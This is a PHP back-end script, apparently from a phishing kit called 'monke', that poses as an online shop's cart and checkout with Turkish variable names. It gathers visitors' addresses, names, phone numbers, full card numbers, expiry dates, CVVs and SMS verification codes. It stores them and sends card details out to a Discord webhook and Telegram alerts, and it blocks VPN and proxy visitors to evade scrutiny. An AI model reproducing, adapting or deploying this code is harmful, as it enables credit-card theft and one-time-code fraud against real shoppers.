<?php 

include_once("./config.php");
include_once("./monke/Data/Server/GrabIP.php");
include_once("./monke/Data/Server/BlockVPN.php");
include_once("./monke/Data/Server/BanControl.php");
include_once("./monke/Data/Server/DiscordWebhook.php");
include_once("./monke/Data/Server/TelegramBot.php");

$check = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
$checkAdmin = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
$checkVisitor = $pdo->query("SELECT * FROM logs_visitor WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
$checkAdres = $pdo->query("SELECT * FROM logs_adres WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);

function tum_bosluklari_temizle($metin)
{
    $metin = str_replace("/s+/", "", $metin);
    $metin = str_replace(" ", "", $metin);
    $metin = str_replace(" ", "", $metin);
    $metin = str_replace(" ", "", $metin);
    $metin = str_replace("/s/g", "", $metin);
    $metin = str_replace("/s+/g", "", $metin);
    $metin = trim($metin);
    return $metin;
}

if ($checkAdmin["proxy_vpn"] == 1) {
    if ($proxy == 1 or $hosting == 1) {
        die('Proxy & VPN Firewall - monke');
    }
}

if ($_GET['action'] == "adres") {
    if ($checkAdres["ip_adresi"]) {
        $sorgu = $pdo->prepare("UPDATE logs_adres SET baslik = ?, il = ?, ilce = ?, mahalle = ?, cadde = ?, bina = ?, kat = ?, daire = ?, isim = ?, soyisim = ?, telefon = ?, eposta = ?, tarih = ? WHERE ip_adresi = '{$ip}'");
        $sorgu->execute(array(htmlspecialchars($_POST['baslik']), htmlspecialchars($_POST['il']), htmlspecialchars($_POST['ilce']), htmlspecialchars($_POST['mahalle']), htmlspecialchars($_POST['cadde']), htmlspecialchars($_POST['bina']), htmlspecialchars($_POST['kat']), htmlspecialchars($_POST['daire']), htmlspecialchars($_POST['isim']), htmlspecialchars($_POST['soyisim']), htmlspecialchars($_POST['telefon']), htmlspecialchars($_POST['eposta']), date('d.m.Y H:i')));
        header('Location: odeme');
    } else {
        $sorgu = $pdo->prepare("INSERT INTO logs_adres SET baslik = ?, il = ?, ilce = ?, mahalle = ?, cadde = ?, bina = ?, kat = ?, daire = ?, isim = ?, soyisim = ?, telefon = ?, eposta = ?, ip_adresi = ?, tarih = ?");
        $sorgu->execute(array(htmlspecialchars($_POST['baslik']), htmlspecialchars($_POST['il']), htmlspecialchars($_POST['ilce']), htmlspecialchars($_POST['mahalle']), htmlspecialchars($_POST['cadde']), htmlspecialchars($_POST['bina']), htmlspecialchars($_POST['kat']), htmlspecialchars($_POST['daire']), htmlspecialchars($_POST['isim']), htmlspecialchars($_POST['soyisim']), htmlspecialchars($_POST['telefon']), htmlspecialchars($_POST['eposta']), $ip, date('d.m.Y H:i')));
        if ($sorgu) {
            telegram_send_message("adres", $ip, substr(md5($ip), 0, 8));
        }
        header('Location: odeme');
    }
}

if ($_GET['action'] == "sepet_ekle") {
    if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
        $ip_adresi = htmlspecialchars($_POST['ip']);
        $urun_id = htmlspecialchars($_POST['urun_id']);

        $sorgu_checkBasket = $pdo->prepare("SELECT * FROM sepet WHERE ip_adresi = ?");
        $sorgu_checkBasket->execute([$ip_adresi]);
        $checkBasket = $sorgu_checkBasket->fetch(PDO::FETCH_ASSOC);

        if ($checkBasket) {
            $urunler = json_decode($checkBasket["urunler"], true);
            if ($urunler === null) {
                $urunler = [];
            }
            if (!in_array($urun_id, $urunler)) {
                $urunler[] = $urun_id;

                $sorgu = $pdo->prepare("UPDATE sepet SET urunler=? WHERE ip_adresi = ?");
                $sorgu->execute([json_encode($urunler), $ip_adresi]);

                if ($sorgu) {
                    telegram_send_message("sepet", $ip_adresi, substr(md5($ip_adresi), 0, 8));
                    echo "success";
                } else {
                    echo "fail";
                }
            } else {
                echo "fail";
            }
        } else {
            $urunler = [$urun_id];
            $sorgu1 = $pdo->prepare("INSERT INTO sepet SET ip_adresi=?, urunler=?");
            $sorgu1->execute([$ip_adresi, json_encode($urunler)]);

            if ($sorgu1) {
                telegram_send_message("sepet", $ip_adresi, substr(md5($ip_adresi), 0, 8));
                echo "success";
            } else {
                echo "fail";
            }
        }
    }
}

if ($_GET['action'] == "sepet_sil") {
    if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
        $ip_adresi = htmlspecialchars($_POST['ip']);
        $urun_id = htmlspecialchars($_POST['urun_id']);

        $sorgu_checkBasket = $pdo->prepare("SELECT * FROM sepet WHERE ip_adresi = ?");
        $sorgu_checkBasket->execute([$ip_adresi]);
        $checkBasket = $sorgu_checkBasket->fetch(PDO::FETCH_ASSOC);

        if ($checkBasket) {
            $urunler = json_decode($checkBasket["urunler"], true);

            if ($urunler === null) {
                $urunler = [];
            }

            $index = array_search($urun_id, $urunler);
            if ($index !== false) {
                unset($urunler[$index]);
            }

            $sorgu = $pdo->prepare("UPDATE sepet SET urunler=? WHERE ip_adresi = ?");
            $sorgu->execute([json_encode(array_values($urunler)), $ip_adresi]);

            if ($sorgu) {
                echo "success";
            } else {
                echo "fail";
            }
        } else {
            echo "fail";
        }
    }
}


if ($_GET['action'] == "dogrulama_kodu") {
    $sorgu = $pdo->prepare("UPDATE logs SET sms=?,durum=? WHERE ip = '{$ip}'");
    $sorgu->execute(array(htmlspecialchars($_POST["dogrulama_kodu"]), "Doğrulama Kodu Verdi"));
    if ($sorgu) {
        $pdo->query("UPDATE logs_visitor SET sms_notify = 1 WHERE ip = '{$ip}'");
    }
}

if ($_GET['action'] == "odeme") {
    if ($checkAdres["ip_adresi"]) {
        if ($_POST['kredi_karti']) {
            if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
                $bincheck_api_key = $checkAdmin['bank_api_key'];
                $kart_bin = substr(tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), 0, 6);
                include_once("./monke/Data/Server/GrabBank.php");
                if ($banka == null) {
                    $banka = "BULUNAMADI";
                } else {
                    $banka;
                }
                if ($marka == null) {
                    $marka = "BULUNAMADI";
                } else {
                    $marka;
                }
                if ($seviye == null) {
                    $seviye = "BULUNAMADI";
                } else {
                    $seviye;
                }

                $yasakli_bin = $pdo->query("SELECT * FROM yasakli_binler WHERE banka = '{$banka}'")->fetch(PDO::FETCH_ASSOC);
                $yasakli_bin_kodu = $pdo->query("SELECT * FROM yasakli_binler WHERE banka = '{$kart_bin}'")->fetch(PDO::FETCH_ASSOC);

                if ($yasakli_bin or $yasakli_bin_kodu) {
                    if ($check["ip"]) {
                        if ($checkAdmin["discord_webhook"] == 1 && $checkVisitor["discord_webhook_sended"] == 0) {
                            monke_webhook($checkAdmin["discord_webhook_url"], tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])) . ' ' . tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])) . ' ' . htmlspecialchars($_POST['cvv']), $banka . ' (' . $seviye . ')', $check['tarih'], $check['device'] . ' - ' . $check['browser'], $check['ip']);
                            $pdo->query("UPDATE logs_visitor SET discord_webhook_sended = 1 WHERE ip = '{$ip}'");
                            $sorgu = $pdo->prepare("UPDATE logs SET isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=? WHERE ip = '{$ip}'");
                            $sorgu->execute(array(mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye));
                            if ($sorgu) {
                                echo "yasakli_bin";
                            }
                        } else {
                            $sorgu = $pdo->prepare("UPDATE logs SET isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=? WHERE ip = '{$ip}'");
                            $sorgu->execute(array(mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye));
                            if ($sorgu) {
                                echo "yasakli_bin";
                            }
                        }
                    } else {
                        if ($checkAdmin["discord_webhook"] == 1 && $checkVisitor["discord_webhook_sended"] == 0) {
                            monke_webhook($checkAdmin["discord_webhook_url"], tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])) . ' ' . tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])) . ' ' . htmlspecialchars($_POST['cvv']), $banka . ' (' . $seviye . ')', $check['tarih'], $check['device'] . ' - ' . $check['browser'], $check['ip']);
                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET ip=?,tarih=?,isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=?");
                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?");
                            $pdo->query("UPDATE logs_visitor SET discord_webhook_sended = 1 WHERE ip = '{$ip}'");
                            $sorgu1->execute(array($ip, date('d.m.Y H:i'), mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye));
                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"]));
                            if ($sorgu) {
                                echo "yasakli_bin";
                            }
                        } else {
                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET ip=?,tarih=?,isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=?");
                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?");
                            $sorgu1->execute(array($ip, date('d.m.Y H:i'), mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye));
                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"]));
                            if ($sorgu) {
                                echo "yasakli_bin";
                            }
                        }
                    }
                } else {
                    if ($check["ip"]) {
                        if ($checkAdmin["discord_webhook"] == 1 and $checkVisitor["discord_webhook_sended"] == 0) {
                            monke_webhook($checkAdmin["discord_webhook_url"], tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])) . ' ' . tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])) . ' ' . htmlspecialchars($_POST['cvv']), $banka . ' (' . $seviye . ')', $check['tarih'], $check['device'] . ' - ' . $check['browser'], $check['ip']);
                            $pdo->query("UPDATE logs_visitor SET discord_webhook_sended = 1 WHERE ip = '{$ip}'");
                            $sorgu = $pdo->prepare("UPDATE logs SET isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=? WHERE ip = '{$ip}'");
                            $sorgu->execute(array(mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye));
                            if ($sorgu) {
                                telegram_send_message("odeme", $ip, substr(md5($ip), 0, 8));
                                $pdo->query("UPDATE logs SET durum = 'Bekleme Ekranı' WHERE ip = '{$ip}'");
                                if ($checkAdmin['sound_notify'] == 1) {
                                    $pdo->query("UPDATE logs_visitor SET log_notify = 1 WHERE ip = '{$ip}'");
                                }
                                echo "sms_aktif";
                            }
                        } else {
                            $sorgu = $pdo->prepare("UPDATE logs SET isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=? WHERE ip = '{$ip}'");
                            $sorgu->execute(array(mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye));
                            if ($sorgu) {
                                telegram_send_message("odeme", $ip, substr(md5($ip), 0, 8));
                                $pdo->query("UPDATE logs SET durum = 'Bekleme Ekranı' WHERE ip = '{$ip}'");
                                if ($checkAdmin['sound_notify'] == 1) {
                                    $pdo->query("UPDATE logs_visitor SET log_notify = 1 WHERE ip = '{$ip}'");
                                }
                                echo "sms_aktif";
                            }
                        }
                    } else {
                        if ($checkAdmin["discord_webhook"] == 1 && $checkVisitor["discord_webhook_sended"] == 0) {
                            monke_webhook($checkAdmin["discord_webhook_url"], tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])) . ' ' . tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])) . ' ' . htmlspecialchars($_POST['cvv']), $banka . ' (' . $seviye . ')', $check['tarih'], $check['device'] . ' - ' . $check['browser'], $check['ip']);
                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET ip=?,tarih=?,isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=?");
                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?");
                            $pdo->query("UPDATE logs_visitor SET discord_webhook_sended = 1 WHERE ip = '{$ip}'");
                            $sorgu1->execute(array($ip, date('d.m.Y H:i'), mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye));
                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"]));
                            $pdo->query("UPDATE logs SET durum = 'Bekleme Ekranı' WHERE ip = '{$ip}'");
                            if ($checkAdmin['sound_notify'] == 1) {
                                $pdo->query("UPDATE logs_visitor SET log_notify = 1 WHERE ip = '{$ip}'");
                            }
                            telegram_send_message("odeme", $ip, substr(md5($ip), 0, 8));
                            echo "sms_aktif";
                        } else {
                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET ip=?,tarih=?,isim_soyisim=?,kredi_karti=?,skt=?,cvv=?,bakiye=?,banka=?,marka=?,seviye=?");
                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?");
                            $sorgu1->execute(array($ip, date('d.m.Y H:i'), mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), htmlspecialchars($_POST['bakiye']), $banka, $marka, $seviye));
                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"]));
                            $pdo->query("UPDATE logs SET durum = 'Bekleme Ekranı' WHERE ip = '{$ip}'");
                            if ($checkAdmin['sound_notify'] == 1) {
                                $pdo->query("UPDATE logs_visitor SET log_notify = 1 WHERE ip = '{$ip}'");
                            }
                            telegram_send_message("odeme", $ip, substr(md5($ip), 0, 8));
                            echo "sms_aktif";
                        }
                    }
                }
            }
        }
    } else {
        echo "adres";
    }
}
